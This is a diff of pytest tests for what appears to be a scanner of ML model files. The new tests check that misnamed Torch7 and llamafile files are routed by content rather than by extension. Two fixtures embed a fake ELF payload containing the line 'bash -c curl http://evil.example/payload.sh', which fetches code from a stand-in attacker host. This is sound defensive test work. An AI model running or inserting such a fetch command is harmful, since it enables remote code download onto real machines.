@@ -583,6 +583,14 @@ def test_get_scanner_for_path_routes_misnamed_torch7_by_content(tmp_path: Path) 
     _assert_scanner_for_path(torch7_path, "torch7")
 
 
+@pytest.mark.parametrize("filename", ["payload.onnx", "payload.pt", "payload.gz", "payload.tar.gz"])
+def test_get_scanner_for_path_prioritizes_torch7_over_recognized_suffix(tmp_path: Path, filename: str) -> None:
+    torch7_path = tmp_path / filename
+    torch7_path.write_bytes(b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\n")
+
+    _assert_scanner_for_path(torch7_path, "torch7")
+
+
 def test_get_scanner_for_path_does_not_route_misnamed_torch_source_text(tmp_path: Path) -> None:
     source_path = tmp_path / "source.jpg"
     source_path.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")
@@ -623,8 +631,39 @@ def test_get_scanner_for_path_routes_extensionless_malicious_llamafile(tmp_path:
     _assert_scanner_for_path(llamafile_path, "llamafile")
 
 
+def test_get_scanner_for_path_routes_misnamed_malicious_llamafile(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "payload.jpg"
+    llamafile_path.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
+def test_get_scanner_for_path_prioritizes_llamafile_over_onnx_suffix(tmp_path: Path) -> None:
+    llamafile_path = tmp_path / "payload.onnx"
+    llamafile_path.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
+
+
 def test_get_scanner_for_path_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
     generic_executable = tmp_path / "tool"
+    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
+
+    assert ScannerRegistry().get_scanner_for_path(str(generic_executable)) is None
+
+
+def test_get_scanner_for_path_does_not_route_misnamed_llamafile_near_match(tmp_path: Path) -> None:
+    generic_executable = tmp_path / "tool.jpg"
     generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")
 
     assert ScannerRegistry().get_scanner_for_path(str(generic_executable)) is None
